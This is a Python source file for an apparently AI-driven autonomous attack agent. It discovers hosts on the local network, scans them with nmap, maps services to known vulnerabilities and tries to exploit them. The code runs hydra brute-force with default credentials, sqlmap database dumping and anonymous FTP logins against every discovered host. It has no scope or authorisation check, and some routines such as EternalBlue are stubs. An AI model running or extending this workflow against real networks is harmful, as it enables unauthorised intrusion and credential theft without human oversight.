#!/usr/bin/env python3
"""
Optimized Autonomous Workflow - Minimal Token Usage, Smart Failure Handling
"""

import asyncio
import time
import json
import os
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

class WorkflowState(Enum):
    """Workflow states to avoid infinite loops"""
    INITIALIZING = "initializing"
    WAITING_FOR_TARGETS = "waiting_for_targets"
    SCANNING = "scanning"
    ANALYZING = "analyzing"
    EXPLOITING = "exploiting"
    LEARNING = "learning"
    COMPLETED = "completed"
    ERROR_RECOVERY = "error_recovery"

@dataclass
class WorkflowStep:
    """Individual workflow step with failure handling"""
    name: str
    max_attempts: int = 3
    attempts: int = 0
    success: bool = False
    error_methods: List[str] = None
    next_steps: List[str] = None
    
    def __post_init__(self):
        if self.error_methods is None:
            self.error_methods = []
        if self.next_steps is None:
            self.next_steps = []

class OptimizedAutonomousWorkflow:
    """Optimized autonomous workflow with minimal AI calls"""
    
    def __init__(self, agent):
        self.agent = agent
        self.logger = agent.logger
        self.state = WorkflowState.INITIALIZING
        self.step_history = []
        self.targets = []
        self.current_step = None
        self.workflow_cycles = 0
        self.max_cycles = 10  # Prevent infinite loops
        
        # Load session data from interactive agent if available
        self.session_data = self._load_session_data()
        
        # Define workflow steps with failure handling
        self.workflow_steps = {
            "scan_network": WorkflowStep(
                name="scan_network",
                max_attempts=3,
                error_methods=["nmap_quick", "nmap_aggressive", "netdiscover"],
                next_steps=["analyze_targets"]
            ),
            "analyze_targets": WorkflowStep(
                name="analyze_targets", 
                max_attempts=2,
                error_methods=["basic_scan", "service_detection"],
                next_steps=["exploit_targets"]
            ),
            "exploit_targets": WorkflowStep(
                name="exploit_targets",
                max_attempts=5,
                error_methods=["metasploit", "custom_exploits", "social_engineering"],
                next_steps=["learn_results"]
            ),
            "learn_results": WorkflowStep(
                name="learn_results",
                max_attempts=1,
                error_methods=["pattern_analysis"],
                next_steps=["completed"]
            )
        }
    
    def _load_session_data(self) -> Dict:
        """Load session data from interactive agent handoff"""
        try:
            if os.path.exists('autonomous_handoff.json'):
                with open('autonomous_handoff.json', 'r') as f:
                    data = json.load(f)
                    self.logger.info(f"Loaded session data: {len(data.get('current_targets', []))} targets")
                    return data
        except Exception as e:
            self.logger.error(f"Failed to load session data: {e}")
        return {}
    
    async def run_workflow(self) -> bool:
        """Run the optimized autonomous workflow"""
        self.logger.info("Starting optimized autonomous workflow")
        
        try:
            # Initialize with session data
            await self._initialize_from_session()
            
            # Main workflow loop (limited cycles)
            while self.workflow_cycles < self.max_cycles and self.state != WorkflowState.COMPLETED:
                self.workflow_cycles += 1
                self.logger.info(f"Workflow cycle {self.workflow_cycles}/{self.max_cycles}")
                
                # Execute current state
                success = await self._execute_current_state()
                
                if not success:
                    await self._handle_failure()
                
                # Brief pause between cycles
                await asyncio.sleep(2)
            
            # Workflow completed or max cycles reached
            if self.state == WorkflowState.COMPLETED:
                self.logger.info("Workflow completed successfully")
                return True
            else:
                self.logger.warning(f"Workflow stopped after {self.max_cycles} cycles")
                return False
                
        except Exception as e:
            self.logger.error(f"Workflow error: {e}")
            return False
    
    async def _initialize_from_session(self):
        """Initialize targets from interactive session"""
        if self.session_data:
            self.targets = self.session_data.get('current_targets', [])
            if self.targets:
                self.state = WorkflowState.SCANNING
                self.logger.info(f"Initialized with {len(self.targets)} targets from session")
            else:
                self.state = WorkflowState.WAITING_FOR_TARGETS
        else:
            self.state = WorkflowState.WAITING_FOR_TARGETS
    
    async def _execute_current_state(self) -> bool:
        """Execute the current workflow state"""
        try:
            if self.state == WorkflowState.WAITING_FOR_TARGETS:
                return await self._discover_targets()
            elif self.state == WorkflowState.SCANNING:
                return await self._scan_targets()
            elif self.state == WorkflowState.ANALYZING:
                return await self._analyze_vulnerabilities()
            elif self.state == WorkflowState.EXPLOITING:
                return await self._exploit_targets()
            elif self.state == WorkflowState.LEARNING:
                return await self._learn_from_results()
            elif self.state == WorkflowState.ERROR_RECOVERY:
                return await self._recover_from_error()
            
            return False
        except Exception as e:
            self.logger.error(f"State execution error: {e}")
            return False
    
    async def _discover_targets(self) -> bool:
        """Discover targets without AI calls - use rule-based approach"""
        self.logger.info("Discovering targets using rule-based approach")
        
        try:
            # Use gateway detection to find network range
            gateway_ip = await self._detect_gateway()
            if gateway_ip:
                network_range = self._extract_network_range(gateway_ip)
                
                # Scan network range
                targets = await self._scan_network_range(network_range)
                self.targets.extend(targets)
                
                if self.targets:
                    self.state = WorkflowState.SCANNING
                    self.logger.info(f"Discovered {len(self.targets)} targets")
                    return True
            
            # If no targets found, try different methods
            self.state = WorkflowState.ERROR_RECOVERY
            return False
            
        except Exception as e:
            self.logger.error(f"Target discovery failed: {e}")
            return False
    
    async def _scan_targets(self) -> bool:
        """Scan targets for vulnerabilities"""
        self.logger.info(f"Scanning {len(self.targets)} targets")
        
        try:
            for target in self.targets[:5]:  # Limit to 5 targets per cycle
                # Use nmap for port scanning
                ports = await self._scan_ports(target)
                
                # Use service detection
                services = await self._detect_services(target, ports)
                
                # Store results
                await self._store_scan_results(target, ports, services)
            
            self.state = WorkflowState.ANALYZING
            return True
            
        except Exception as e:
            self.logger.error(f"Target scanning failed: {e}")
            return False
    
    async def _analyze_vulnerabilities(self) -> bool:
        """Analyze vulnerabilities using rule-based approach"""
        self.logger.info("Analyzing vulnerabilities")
        
        try:
            # Get scan results
            scan_results = await self._get_scan_results()
            
            # Apply vulnerability rules (no AI needed)
            vulnerabilities = []
            for result in scan_results:
                vulns = self._apply_vulnerability_rules(result)
                vulnerabilities.extend(vulns)
            
            if vulnerabilities:
                self.state = WorkflowState.EXPLOITING
                return True
            else:
                self.state = WorkflowState.ERROR_RECOVERY
                return False
                
        except Exception as e:
            self.logger.error(f"Vulnerability analysis failed: {e}")
            return False
    
    async def _exploit_targets(self) -> bool:
        """Exploit targets using available tools"""
        self.logger.info("Attempting exploitation")
        
        try:
            vulnerabilities = await self._get_vulnerabilities()
            
            for vuln in vulnerabilities[:3]:  # Limit to 3 exploits per cycle
                success = await self._attempt_exploit(vuln)
                if success:
                    self.logger.info(f"Successful exploit: {vuln['target']}")
                    await self._store_exploit_result(vuln, success=True)
                else:
                    await self._store_exploit_result(vuln, success=False)
            
            self.state = WorkflowState.LEARNING
            return True
            
        except Exception as e:
            self.logger.error(f"Exploitation failed: {e}")
            return False
    
    async def _learn_from_results(self) -> bool:
        """Learn from results without AI calls"""
        self.logger.info("Learning from results")
        
        try:
            # Analyze patterns in results
            patterns = await self._analyze_patterns()
            
            # Update learned knowledge
            await self._update_knowledge_base(patterns)
            
            # Decide next action based on results
            if await self._has_more_targets():
                self.state = WorkflowState.SCANNING
            else:
                self.state = WorkflowState.COMPLETED
            
            return True
            
        except Exception as e:
            self.logger.error(f"Learning failed: {e}")
            return False
    
    async def _handle_failure(self):
        """Handle workflow failures"""
        self.logger.warning("Handling workflow failure")
        
        # Try alternative methods
        if self.current_step and self.current_step.attempts < self.current_step.max_attempts:
            self.current_step.attempts += 1
            # Try next error method
            if self.current_step.error_methods:
                method = self.current_step.error_methods.pop(0)
                self.logger.info(f"Trying alternative method: {method}")
        else:
            self.state = WorkflowState.ERROR_RECOVERY
    
    async def _detect_gateway(self) -> Optional[str]:
        """Detect gateway using system commands"""
        try:
            import subprocess
            import platform
            
            if platform.system() == "Windows":
                result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                # Parse for gateway
                for line in result.stdout.split('\n'):
                    if 'Default Gateway' in line and ':' in line:
                        return line.split(':')[1].strip()
            else:
                result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True)
                # Parse for gateway
                parts = result.stdout.split()
                if 'via' in parts:
                    idx = parts.index('via')
                    if idx + 1 < len(parts):
                        return parts[idx + 1]
            
            return None
        except Exception as e:
            self.logger.error(f"Gateway detection failed: {e}")
            return None
    
    def _extract_network_range(self, gateway_ip: str) -> str:
        """Extract network range from gateway IP"""
        try:
            parts = gateway_ip.split('.')
            if len(parts) == 4:
                return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
        except:
            pass
        return "192.168.1.0/24"  # Default fallback
    
    async def _scan_network_range(self, network_range: str) -> List[str]:
        """Scan network range for live hosts"""
        try:
            import subprocess
            
            # Use nmap for host discovery
            result = subprocess.run([
                'nmap', '-sn', network_range
            ], capture_output=True, text=True, timeout=60)
            
            # Parse results for live hosts
            hosts = []
            for line in result.stdout.split('\n'):
                if 'Nmap scan report for' in line:
                    # Extract IP address
                    parts = line.split()
                    if len(parts) >= 5:
                        ip = parts[4]
                        hosts.append(ip)
            
            return hosts
            
        except Exception as e:
            self.logger.error(f"Network scan failed: {e}")
            return []
    
    async def _scan_ports(self, target: str) -> List[int]:
        """Scan target for open ports"""
        try:
            import subprocess
            
            # Quick port scan
            result = subprocess.run([
                'nmap', '-T4', '--top-ports', '1000', target
            ], capture_output=True, text=True, timeout=120)
            
            # Parse for open ports
            ports = []
            for line in result.stdout.split('\n'):
                if '/tcp' in line and 'open' in line:
                    try:
                        port = int(line.split('/')[0])
                        ports.append(port)
                    except:
                        pass
            
            return ports
            
        except Exception as e:
            self.logger.error(f"Port scan failed for {target}: {e}")
            return []
    
    async def _detect_services(self, target: str, ports: List[int]) -> Dict[int, str]:
        """Detect services on open ports"""
        try:
            import subprocess
            
            # Service detection
            result = subprocess.run([
                'nmap', '-sV', '--version-intensity', '1', target
            ], capture_output=True, text=True, timeout=180)
            
            # Parse services
            services = {}
            for line in result.stdout.split('\n'):
                if '/tcp' in line and 'open' in line:
                    try:
                        parts = line.split()
                        port = int(parts[0].split('/')[0])
                        if len(parts) > 2:
                            service = parts[2]
                            services[port] = service
                    except:
                        pass
            
            return services
            
        except Exception as e:
            self.logger.error(f"Service detection failed for {target}: {e}")
            return {}
    
    def _apply_vulnerability_rules(self, scan_result: Dict) -> List[Dict]:
        """Apply rule-based vulnerability detection"""
        vulnerabilities = []
        
        # Common vulnerability patterns
        vuln_patterns = {
            'ssh': {'port': 22, 'vulns': ['weak_credentials', 'old_versions']},
            'ftp': {'port': 21, 'vulns': ['anonymous_access', 'weak_credentials']},
            'telnet': {'port': 23, 'vulns': ['unencrypted', 'weak_credentials']},
            'http': {'port': 80, 'vulns': ['sqli', 'xss', 'directory_traversal']},
            'https': {'port': 443, 'vulns': ['ssl_weak', 'sqli', 'xss']},
            'smb': {'port': 445, 'vulns': ['eternalblue', 'weak_credentials']},
            'rdp': {'port': 3389, 'vulns': ['weak_credentials', 'bluekeep']},
            'mysql': {'port': 3306, 'vulns': ['weak_credentials']},
            'postgresql': {'port': 5432, 'vulns': ['weak_credentials']},
            'mssql': {'port': 1433, 'vulns': ['weak_credentials']},
        }
        
        target = scan_result.get('target', '')
        services = scan_result.get('services', {})
        
        for port, service in services.items():
            service_lower = service.lower()
            for service_name, vuln_info in vuln_patterns.items():
                if service_name in service_lower:
                    for vuln in vuln_info['vulns']:
                        vulnerabilities.append({
                            'target': target,
                            'port': port,
                            'service': service,
                            'vulnerability': vuln,
                            'confidence': 'high' if vuln in ['eternalblue', 'bluekeep'] else 'medium'
                        })
        
        return vulnerabilities
    
    async def _attempt_exploit(self, vulnerability: Dict) -> bool:
        """Attempt to exploit a vulnerability"""
        try:
            target = vulnerability['target']
            vuln_type = vulnerability['vulnerability']
            
            # Rule-based exploitation
            if vuln_type == 'weak_credentials':
                return await self._attempt_brute_force(target, vulnerability.get('port', 22))
            elif vuln_type == 'eternalblue':
                return await self._attempt_eternalblue(target)
            elif vuln_type == 'sqli':
                return await self._attempt_sqli(target)
            elif vuln_type == 'anonymous_access':
                return await self._attempt_anonymous_ftp(target)
            
            return False
            
        except Exception as e:
            self.logger.error(f"Exploit attempt failed: {e}")
            return False
    
    async def _attempt_brute_force(self, target: str, port: int) -> bool:
        """Attempt brute force attack"""
        try:
            import subprocess
            
            # Common credentials
            usernames = ['admin', 'root', 'administrator', 'user', 'guest']
            passwords = ['admin', 'password', '123456', 'root', '', 'admin123']
            
            service = 'ssh' if port == 22 else 'ftp' if port == 21 else 'telnet'
            
            for username in usernames[:3]:  # Limit attempts
                for password in passwords[:3]:
                    result = subprocess.run([
                        'hydra', '-l', username, '-p', password,
                        f'{service}://{target}'
                    ], capture_output=True, text=True, timeout=30)
                    
                    if 'login:' in result.stdout and 'password:' in result.stdout:
                        self.logger.info(f"Brute force success: {username}:{password}")
                        return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Brute force failed: {e}")
            return False
    
    async def _attempt_eternalblue(self, target: str) -> bool:
        """Attempt EternalBlue exploit"""
        try:
            # This would use metasploit or custom exploit
            self.logger.info(f"Attempting EternalBlue on {target}")
            # Implementation would go here
            return False
            
        except Exception as e:
            self.logger.error(f"EternalBlue failed: {e}")
            return False
    
    async def _attempt_sqli(self, target: str) -> bool:
        """Attempt SQL injection"""
        try:
            import subprocess
            
            # Use sqlmap
            result = subprocess.run([
                'sqlmap', '-u', f'http://{target}', '--batch', '--dbs'
            ], capture_output=True, text=True, timeout=120)
            
            if 'available databases' in result.stdout:
                self.logger.info(f"SQL injection success on {target}")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"SQL injection failed: {e}")
            return False
    
    async def _attempt_anonymous_ftp(self, target: str) -> bool:
        """Attempt anonymous FTP access"""
        try:
            import subprocess
            
            result = subprocess.run([
                'ftp', '-n', target
            ], input=b'user anonymous\npass anonymous\nls\nquit\n', 
            capture_output=True, text=True, timeout=30)
            
            if '230' in result.stdout:  # FTP success code
                self.logger.info(f"Anonymous FTP access on {target}")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Anonymous FTP failed: {e}")
            return False
    
    # Placeholder methods for data storage and retrieval
    async def _store_scan_results(self, target: str, ports: List[int], services: Dict[int, str]):
        """Store scan results"""
        # Implementation would store in database
        pass
    
    async def _get_scan_results(self) -> List[Dict]:
        """Get scan results"""
        # Implementation would retrieve from database
        return []
    
    async def _store_exploit_result(self, vuln: Dict, success: bool):
        """Store exploit result"""
        # Implementation would store in database
        pass
    
    async def _get_vulnerabilities(self) -> List[Dict]:
        """Get vulnerabilities"""
        # Implementation would retrieve from database
        return []
    
    async def _analyze_patterns(self) -> Dict:
        """Analyze patterns in results"""
        # Implementation would analyze results
        return {}
    
    async def _update_knowledge_base(self, patterns: Dict):
        """Update knowledge base"""
        # Implementation would update knowledge
        pass
    
    async def _has_more_targets(self) -> bool:
        """Check if there are more targets to process"""
        return len(self.targets) > 0
    
    async def _recover_from_error(self) -> bool:
        """Recover from error state"""
        self.logger.info("Attempting error recovery")
        
        # Try to recover by resetting state
        if self.targets:
            self.state = WorkflowState.SCANNING
        else:
            self.state = WorkflowState.WAITING_FOR_TARGETS
        
        return True
